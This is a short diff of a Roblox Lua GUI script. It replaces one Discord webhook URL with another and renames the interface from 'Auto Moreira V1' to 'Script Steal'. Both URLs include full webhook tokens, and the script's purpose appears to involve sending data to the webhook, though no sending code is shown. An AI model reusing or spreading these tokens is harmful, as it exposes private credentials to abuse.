@@ -8,11 +8,11 @@ local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 -- ⚠️ INSERISCI IL TUO WEBHOOK URL QUI ⚠️
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1444347099381498051/aHT-fHt68BuhNs2pYCNzy1MCw9jjzO6cpnh-nTfX1LrOIN74ZiZOvVOtfFyRK8mz23Rd"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1443708006587174942/Dc_V0rQoW4B7ypWwRzpyTgdPSNGlh-7E0WTY_3ekAN5RWleDaGZGO9djuiIDv8nH6YSB"
 
 -- Crea la GUI principale
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "Auto Moreira V1"
+screenGui.Name = "Script Steal"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = playerGui
@@ -37,7 +37,7 @@ title.Size = UDim2.new(1, 0, 0, 50)
 title.Position = UDim2.new(0, 0, 0, 0)
 title.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
 title.BorderSizePixel = 0
-title.Text = "Auto Moreira V1"
+title.Text = "Script Steal"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextSize = 20
 title.Font = Enum.Font.GothamBold
